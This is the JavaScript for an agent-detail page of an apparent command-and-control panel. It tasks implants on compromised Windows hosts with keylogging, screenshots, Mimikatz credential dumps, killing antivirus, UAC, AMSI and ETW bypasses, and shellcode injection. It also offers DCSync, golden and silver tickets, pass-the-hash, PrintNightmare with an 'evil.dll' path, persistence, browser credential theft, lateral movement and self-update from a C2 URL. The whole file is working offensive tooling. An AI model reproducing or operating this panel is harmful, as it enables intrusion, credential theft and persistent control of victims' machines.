let currentTab = 'overview';

function switchTab(tab) {
    currentTab = tab;
    document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
    document.getElementById('tab-' + tab).classList.remove('hidden');
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('bg-indigo-600', 'text-white');
        btn.classList.add('text-slate-600', 'hover:bg-slate-100');
    });
    const active = document.querySelector(`.tab-btn[data-tab="${tab}"]`);
    if (active) {
        active.classList.remove('text-slate-600', 'hover:bg-slate-100');
        active.classList.add('bg-indigo-600', 'text-white');
    }
    if (tab === 'tasks') checkPendingTasks();
}

document.addEventListener('DOMContentLoaded', function() {
    switchTab('overview');
    setInterval(() => { if (currentTab === 'tasks') checkPendingTasks(); }, 5000);
    fetchRPortFwdStatus(agentId);
});

function checkPendingTasks() {
    const pending = document.querySelectorAll('.task-card[data-status="pending"]');
    if (pending.length === 0) {
        document.getElementById('tasks-live').classList.add('hidden');
        return;
    }
    document.getElementById('tasks-live').classList.remove('hidden');
    fetch('/agents/' + agentId + '/tasks')
        .then(r => r.text())
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const newList = doc.getElementById('tasks-list');
            const oldList = document.getElementById('tasks-list');
            if (newList && oldList) oldList.innerHTML = newList.innerHTML;
        })
        .catch(() => showToast('任务列表刷新失败', 'error'));
}

function sendQuickCommand(agentId, cmd) {
    document.getElementById('cmd-result').innerHTML = '<div class="text-yellow-400">正在执行: ' + escapeHtml(cmd) + '...</div>';
    fetch(`/agents/${agentId}/command`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `command=${encodeURIComponent(cmd)}&shell=cmd.exe`
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(agentId, data.task_id, 'cmd-result'), 1500);
    });
}

function sendQuickCommandPS(agentId, cmd) {
    document.getElementById('cmd-result').innerHTML = '<div class="text-yellow-400">正在执行 PowerShell: ' + escapeHtml(cmd) + '...</div>';
    fetch(`/agents/${agentId}/command`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `command=${encodeURIComponent(cmd)}&shell=powershell.exe`
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(agentId, data.task_id, 'cmd-result'), 1500);
    });
}

function fetchResult(agentId, taskId, targetId) {
    fetch(`/agents/${agentId}/tasks/${taskId}`)
        .then(r => r.json()).then(data => {
            const el = document.getElementById(targetId);
            if (!el) return;
            if (data.error) { el.innerHTML = '<span class="text-red-400">' + escapeHtml(data.error) + '</span>'; return; }
            if (data.status === 'completed') {
                el.innerHTML = data.result ? '<pre class="whitespace-pre-wrap">' + escapeHtml(data.result) + '</pre>' : '<span class="text-emerald-400">Completed</span>';
            } else if (data.status === 'failed') {
                el.innerHTML = '<span class="text-red-400">' + escapeHtml(data.error || 'Failed') + '</span>';
            } else {
                el.innerHTML = '<span class="text-yellow-400">等待中...</span>';
                setTimeout(() => fetchResult(agentId, taskId, targetId), 3000);
            }
        }).catch(() => setTimeout(() => fetchResult(agentId, taskId, targetId), 3000));
}

function requestPS(agentId) {
    fetch(`/agents/${agentId}/ps`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) showToast('进程列表已请求'); });
}
function requestScreenshot(agentId) {
    fetch(`/agents/${agentId}/screenshot`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) showToast('截图已请求'); });
}

function startKeyloggerQuick(agentId) {
    fetch(`/agents/${agentId}/keylogger/start`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) showToast('Keylogger started'); });
}
function stopKeyloggerQuick(agentId) {
    fetch(`/agents/${agentId}/keylogger/stop`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) showToast('Keylogger stopped'); });
}
function dumpKeyloggerQuick(agentId) {
    fetch(`/agents/${agentId}/keylogger/dump`, { method: 'POST' })
        .then(r => r.json()).then(data => { if (data.success) showToast('Keylogger dump requested'); });
}

function killAVQuick(agentId) { if (!confirm('确认终止反病毒进程？')) return; fetch(`/agents/${agentId}/kill_av`, { method: 'POST' }); showToast('Terminate AV sent'); }
function elevateQuick(agentId) { fetch(`/agents/${agentId}/elevate`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Elevate sent'); }); }
function credsQuick(agentId) { fetch(`/agents/${agentId}/creds`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Creds dump requested'); }); }
function injectQuick(agentId) { const pid = prompt("Target PID:"); if (!pid) return; fetch(`/agents/${agentId}/inject`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'pid=' + encodeURIComponent(pid) + '&tech=&shellcode=' }); showToast('Inject sent'); }
function lateralQuick(agentId) { const spec = prompt("Lateral spec:", "winrm|127.0.0.1||whoami"); if (!spec) return; fetch(`/agents/${agentId}/lateral`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'spec=' + encodeURIComponent(spec) }); showToast('Lateral sent'); }
function spawnQuick(agentId) {
    const target = prompt("Target executable:", "rundll32.exe");
    if (!target) return;
    const technique = prompt("Technique (CreateRemoteThread or QueueUserAPC):", "CreateRemoteThread");
    if (!technique) return;
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.bin,.raw';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData();
        fd.append('target', target);
        fd.append('technique', technique);
        fd.append('shellcode', file);
        fetch(`/agents/${agentId}/spawn`, { method: 'POST', body: fd })
            .then(r => r.json()).then(d => showToast(d.message || 'Spawn sent'));
    };
    input.click();
}
function socksQuick(agentId) { const port = prompt("SOCKS5 port:", "1080"); fetch(`/agents/${agentId}/socks`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'port=' + encodeURIComponent(port || "1080") }); showToast('SOCKS sent'); }
function tokenListProcsQuick(agentId) { fetch(`/agents/${agentId}/token/list`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Enum tokens sent'); }); }
function tokenWhoamiQuick(agentId) { fetch(`/agents/${agentId}/token/whoami`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Token whoami sent'); }); }
function tokenRevertQuick(agentId) { fetch(`/agents/${agentId}/token/revert`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Rev2Self sent'); }); }
function suspendQuick(agentId) { const inp = document.getElementById('proc-target-' + agentId); const target = inp ? inp.value.trim() : ''; if (!target) { showToast('请输入 PID 或进程名', 'error'); return; } fetch(`/agents/${agentId}/suspend`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'target=' + encodeURIComponent(target) }).then(() => showToast('Suspend sent')); }
function resumeQuick(agentId) { const inp = document.getElementById('proc-target-' + agentId); const target = inp ? inp.value.trim() : ''; if (!target) { showToast('请输入 PID 或进程名', 'error'); return; } fetch(`/agents/${agentId}/resume`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'target=' + encodeURIComponent(target) }).then(() => showToast('Resume sent')); }

function addNote() {
    const display = document.getElementById('notes-display');
    const input = document.getElementById('notes-input');
    if (input.classList.contains('hidden')) {
        input.value = display.textContent.trim() === '点击添加备注' ? '' : display.textContent.trim();
        display.classList.add('hidden');
        input.classList.remove('hidden');
        input.focus();
    } else {
        const note = input.value.trim();
        fetch('/agents/' + agentId + '/note', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'notes=' + encodeURIComponent(note)
        }).then(() => {
            display.textContent = note || '点击添加备注';
            display.classList.remove('hidden');
            input.classList.add('hidden');
            showToast('备注已保存');
        });
    }
}

function deleteAgent(agentId) {
    fetch(`/agents/${agentId}`, { method: 'DELETE' })
        .then(() => { showToast('Implant 已删除'); setTimeout(() => window.location = '/agents', 800); });
}

function cancelTask(agentId, taskId) {
    if (!confirm('确定取消任务 #' + taskId + ' 吗？')) return;
    fetch(`/agents/${agentId}/tasks/${taskId}/cancel`, { method: 'POST' })
        .then(r => r.json()).then(data => {
            if (data.success) { showToast('任务已取消'); checkPendingTasks(); }
            else showToast('取消失败: ' + (data.error || ''), 'error');
        }).catch(err => showToast('请求失败: ' + err, 'error'));
}
function rerunTaskFromDetail(agentId, taskId) {
    fetch(`/agents/${agentId}/task/${taskId}/rerun`, { method: 'POST' })
        .then(r => r.json()).then(data => {
            if (data.success) showToast('任务已重新创建');
            else showToast('重跑失败: ' + (data.error || ''), 'error');
        }).catch(err => showToast('请求失败: ' + err, 'error'));
}

function confirmAction(message, callback) { if (confirm(message)) callback(); }

function showScreenshotModal(agentId, filename) {
    const modal = document.createElement('div');
    modal.className = 'fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4';
    modal.innerHTML = `<div class="relative max-w-[95vw] max-h-[95vh] flex items-center justify-center">
        <img src="/screenshots/${agentId}/${filename}" class="max-w-[95vw] max-h-[90vh] w-auto h-auto object-contain rounded-2xl shadow-2xl" />
        <div class="fixed top-4 right-4 flex gap-2">
            <a href="/screenshots/${agentId}/${filename}" download class="bg-white hover:bg-slate-100 transition-colors text-xs px-4 h-9 flex items-center rounded-2xl border shadow">下载</a>
            <button onclick="this.closest('.fixed').remove()" class="bg-white hover:bg-red-100 transition-colors text-xs px-4 h-9 flex items-center rounded-2xl border shadow">关闭</button>
        </div>
    </div>`;
    document.body.appendChild(modal);
    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
}

function showScreenshotDataUrl(src) {
    const modal = document.createElement('div');
    modal.className = 'fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4';
    modal.innerHTML = `<div class="relative max-w-[95vw] max-h-[95vh] flex items-center justify-center">
        <img src="${src}" class="max-w-[95vw] max-h-[90vh] w-auto h-auto object-contain rounded-2xl shadow-2xl" />
        <button onclick="this.closest('.fixed').remove()" class="fixed top-4 right-4 bg-white hover:bg-red-100 transition-colors text-xs px-4 h-9 flex items-center rounded-2xl border shadow">关闭</button>
    </div>`;
    document.body.appendChild(modal);
    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
}

function kerberoastQuick(agentId) {
    fetch(`/agents/${agentId}/kerberoast`, { method: 'POST' })
        .then(r => r.json()).then(d => showToast(d.message || 'Kerberoast requested'));
}
function mimikatzQuick(agentId) {
    const cmd = prompt('Mimikatz command:', 'sekurlsa::logonpasswords');
    if (!cmd) return;
    fetch(`/agents/${agentId}/mimikatz`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'command=' + encodeURIComponent(cmd) })
        .then(r => r.json()).then(d => showToast('Mimikatz sent'));
}
function executeAssemblyQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.exe,.dll,.net';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('assembly', file);
        fetch(`/agents/${agentId}/execute_assembly`, { method: 'POST', body: fd })
            .then(r => r.json()).then(d => showToast(d.message || 'Execute-assembly sent'));
    };
    input.click();
}
function bofQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.o,.obj,.coff';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const args = prompt('BOF arguments (space-separated):', '') || '';
        const fd = new FormData(); fd.append('bof', file); fd.append('args', args);
        fetch(`/agents/${agentId}/bof`, { method: 'POST', body: fd })
            .then(r => r.json()).then(d => showToast(d.message || 'BOF sent'));
    };
    input.click();
}
function powerPickQuick(agentId) {
    const script = prompt('PowerShell script to execute:', 'Get-Process | Out-String');
    if (!script) return;
    fetch(`/agents/${agentId}/powerpick`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'script=' + encodeURIComponent(script) })
        .then(r => r.json()).then(d => showToast(d.message || 'PowerPick sent'));
}
function printNightmareQuick(agentId) {
    const dll = prompt('Full path to DLL on target (upload via File Browser first):', 'C:\\Windows\\Temp\\evil.dll');
    if (!dll) return;
    fetch(`/agents/${agentId}/elevate/printnightmare`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'dll_path=' + encodeURIComponent(dll) })
        .then(r => r.json()).then(d => showToast('PrintNightmare sent'));
}
function fetchRPortFwdStatus(agentId) {
    fetch(`/agents/${agentId}/rportfwd/status`)
        .then(r => r.json()).then(data => {
            const el = document.getElementById('rportfwd-status');
            if (!el) return;
            if (data.active) {
                el.innerHTML = '<div class="flex items-center justify-between"><span class="text-emerald-600 font-medium">端口 ' + data.port + ' → ' + data.target + '</span><span class="text-xs text-slate-400">活跃</span></div>';
            } else {
                el.innerHTML = '<span class="text-slate-400">未启用</span>';
            }
        }).catch(() => showToast('端口转发状态刷新失败', 'error'));
}

function peloaderQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.dll';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('dll', file);
        fetch(`/agents/${agentId}/peloader`, { method: 'POST', body: fd })
            .then(r => r.json()).then(d => showToast(d.message || 'PE Loader sent'));
    };
    input.click();
}
function executeAssemblyForkRunQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.exe,.dll,.net';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('assembly', file);
        fetch(`/agents/${agentId}/execute_assembly_forkrun`, { method: 'POST', body: fd })
            .then(r => r.json()).then(d => showToast(d.message || 'Fork&Run sent'));
    };
    input.click();
}
function rportfwdRelayQuick(agentId) {
    const lport = prompt('Local listening port:', '1081');
    if (!lport) return;
    const target = prompt('Forward target (host:port):', '10.0.0.1:3389');
    if (!target) return;
    fetch(`/agents/${agentId}/rportfwd/start`, {
        method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'lport=' + encodeURIComponent(lport) + '&target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(d => showToast(d.message || 'rportfwd started'));
}
function dcsyncQuick(agentId) {
    const user = prompt('Target user (default: krbtgt):', 'krbtgt');
    fetch(`/agents/${agentId}/dcsync`, {
        method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'user=' + encodeURIComponent(user || 'krbtgt')
    }).then(r => r.json()).then(d => showToast(d.message || 'DCSync sent'));
}
function goldenTicketQuick(agentId) {
    const user = prompt('Username:'); if (!user) return;
    const domain = prompt('Domain:'); if (!domain) return;
    const sid = prompt('Domain SID:'); if (!sid) return;
    const hash = prompt('krbtgt NTLM hash:'); if (!hash) return;
    fetch(`/agents/${agentId}/golden_ticket`, {
        method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&sid=' + encodeURIComponent(sid) + '&krbtgt_hash=' + encodeURIComponent(hash)
    }).then(r => r.json()).then(d => showToast(d.message || 'Golden ticket sent'));
}
function silverTicketQuick(agentId) {
    const user = prompt('Username:'); if (!user) return;
    const domain = prompt('Domain:'); if (!domain) return;
    const sid = prompt('Domain SID:'); if (!sid) return;
    const target = prompt('Target service (e.g. CIFS/SERVER):'); if (!target) return;
    const hash = prompt('Service RC4 hash:'); if (!hash) return;
    fetch(`/agents/${agentId}/silver_ticket`, {
        method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&sid=' + encodeURIComponent(sid) + '&target=' + encodeURIComponent(target) + '&rc4_hash=' + encodeURIComponent(hash)
    }).then(r => r.json()).then(d => showToast(d.message || 'Silver ticket sent'));
}
function asreproastQuick(agentId) {
    fetch(`/agents/${agentId}/asreproast`, { method: 'POST' })
        .then(r => r.json()).then(d => showToast(d.message || 'ASREP roast sent'));
}
function passTheHashQuick(agentId) {
    const user = prompt('Username:'); if (!user) return;
    const domain = prompt('Domain:'); if (!domain) return;
    const hash = prompt('NTLM hash:'); if (!hash) return;
    const target = prompt('Target (host:port, optional):') || '';
    fetch(`/agents/${agentId}/pass_the_hash`, {
        method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&ntlm_hash=' + encodeURIComponent(hash) + '&target=' + encodeURIComponent(target)
    }).then(r => r.json()).then(d => showToast(d.message || 'PTH sent'));
}
function passTheTicketQuick(agentId) {
    const input = document.createElement('input');
    input.type = 'file'; input.accept = '.kirbi,.bin';
    input.onchange = function() {
        const file = input.files[0]; if (!file) return;
        const fd = new FormData(); fd.append('ticket', file);
        fetch(`/agents/${agentId}/pass_the_ticket`, { method: 'POST', body: fd })
            .then(r => r.json()).then(d => showToast(d.message || 'PTT sent'));
    };
    input.click();
}
function persistenceQuick(agentId) {
    const methods = ["registry", "scheduled_task", "startup_folder", "wmi", "service", "image_file", "com_hijack", "dll_search_order"];
    const method = prompt("Persistence method:\n" + methods.join(", "), "registry");
    if (!method || !methods.includes(method)) return;
    const action = prompt("Action (add, list, remove):", "add");
    if (!action || !["add","list","remove"].includes(action)) return;
    if (action === "list") {
        fetch(`/agents/${agentId}/persistence`, {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'action=list'
        }).then(r => r.json()).then(d => { if (d.success) showToast('Persistence list requested'); });
        return;
    }
    let body = 'action=' + action + '&method=' + encodeURIComponent(method);
    if (action === "add" || action === "remove") {
        if (method === "dll_search_order") {
            const dllPath = prompt("Full path to DLL on target:", "C:\\Windows\\Temp\\evil.dll");
            if (!dllPath) return;
            body += '&binary_path=' + encodeURIComponent(dllPath);
        } else {
            const binPath = prompt("Binary path (leave empty for current exe):", "");
            if (binPath) body += '&binary_path=' + encodeURIComponent(binPath);
        }
    }
    fetch(`/agents/${agentId}/persistence`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: body
    }).then(r => r.json()).then(d => { if (d.success) showToast('Persistence ' + action + ' sent for ' + method); });
}

function browserStealQuick(agentId) {
    const browser = prompt("Browser (chrome, edge, firefox, all):", "all");
    if (!browser) return;
    fetch(`/agents/${agentId}/browser_steal`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'browser=' + encodeURIComponent(browser)
    }).then(r => r.json()).then(d => showToast(d.message || 'Browser steal sent'));
}
function uacBypassQuick(agentId, method) {
    const payload = prompt('Payload path (leave empty for current agent binary):', window.location.origin + '/...');
    let body = 'method=' + encodeURIComponent(method);
    if (payload && payload.trim() !== '') {
        body += '&payload=' + encodeURIComponent(payload.trim());
    }
    fetch(`/agents/${agentId}/uac_bypass`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: body
    }).then(r => r.json()).then(d => { if (d.success) showToast('UAC bypass (' + method + ') sent'); });
}
function amsiBypassQuick(agentId) {
    fetch(`/agents/${agentId}/amsi_bypass`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    }).then(r => r.json()).then(d => { if (d.success) showToast('AMSI bypass sent'); });
}
function etwBypassQuick(agentId) {
    fetch(`/agents/${agentId}/etw_bypass`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    }).then(r => r.json()).then(d => { if (d.success) showToast('ETW bypass sent'); });
}
function selfUpdateQuick(agentId) {
    const url = prompt('下载新 Implant 的 URL:', 'http://your-c2-server/path/to/new-agent.exe');
    if (!url) return;
    fetch(`/agents/${agentId}/self_update`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'url=' + encodeURIComponent(url)
    }).then(r => r.json()).then(d => { if (d.success) showToast('Self-update sent — agent will restart'); });
}

function netCommandQuick(agentId, cmd) {
    document.getElementById('cmd-result').innerHTML = '<div class="text-yellow-400">正在执行: net ' + escapeHtml(cmd) + '...</div>';
    fetch(`/agents/${agentId}/net`, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'command=' + encodeURIComponent(cmd)
    }).then(r => r.json()).then(data => {
        if (data.success) setTimeout(() => fetchResult(agentId, data.task_id, 'cmd-result'), 1500);
    });
}
function netCommandQuickCustom(agentId) {
    const inp = document.getElementById('net-custom-' + agentId);
    const cmd = inp ? inp.value.trim() : '';
    if (!cmd) return;
    netCommandQuick(agentId, cmd);
}

async function toggleLock(agentId) {
    const indicator = document.getElementById('lock-indicator-' + agentId);
    if (!indicator) return;
    const isLocked = indicator.getAttribute('data-locked') === 'true';
    const url = isLocked ? `/agents/${agentId}/unlock` : `/agents/${agentId}/lock`;
    try {
        const resp = await fetch(url, { method: 'POST', headers: { 'X-CSRF-Token': getCSRFToken() } });
        const data = await resp.json();
        if (data.success) {
            showToast(isLocked ? '已解锁' : '已锁定', 'success');
            if (isLocked) {
                indicator.innerHTML = '';
                indicator.removeAttribute('data-locked');
            } else {
                indicator.innerHTML = '<span class="text-xs bg-amber-100 text-amber-700 px-2 py-1 rounded-full"><i class="fa-solid fa-lock mr-1"></i>您已锁定</span>';
                indicator.setAttribute('data-locked', 'true');
            }
        } else {
            showToast('锁定失败: ' + (data.error || ''), 'error');
        }
    } catch (e) {
        showToast('请求失败', 'error');
    }
}

document.addEventListener('DOMContentLoaded', function() {
    fetch('/api/collab/locks').then(r => r.json()).then(d => {
        if (d.success && d.locks) {
            const lock = d.locks.find(l => l.agent_id === agentId);
            const indicator = document.getElementById('lock-indicator-' + agentId);
            if (lock && indicator) {
                indicator.innerHTML = `<span class="text-xs bg-amber-100 text-amber-700 px-2 py-1 rounded-full"><i class="fa-solid fa-lock mr-1"></i>${lock.username}</span>`;
            }
        }
    }).catch(() => showToast('Implant 状态刷新失败', 'error'));
    refreshAgentViewers(agentId);
    setInterval(() => refreshAgentViewers(agentId), 10000);
    window.addEventListener('collab:viewing_agent', function(e) {
        if (e.detail && e.detail.agent_id === agentId) {
            refreshAgentViewers(agentId);
        }
    });
});

async function refreshAgentViewers(agentId) {
    try {
        const resp = await fetch('/api/collab/agent-viewers/' + agentId);
        const data = await resp.json();
        const container = document.getElementById('agent-viewers-' + agentId);
        const label = document.getElementById('agent-viewers-label-' + agentId);
        if (!container || !label) return;
        const others = data.viewers ? data.viewers.filter(v => v.username !== window.currentUserDisplayName) : [];
        if (others.length > 0) {
            container.classList.remove('hidden');
            label.textContent = others.map(v => v.username).join(', ');
        } else {
            container.classList.add('hidden');
        }
    } catch(e) {}
}


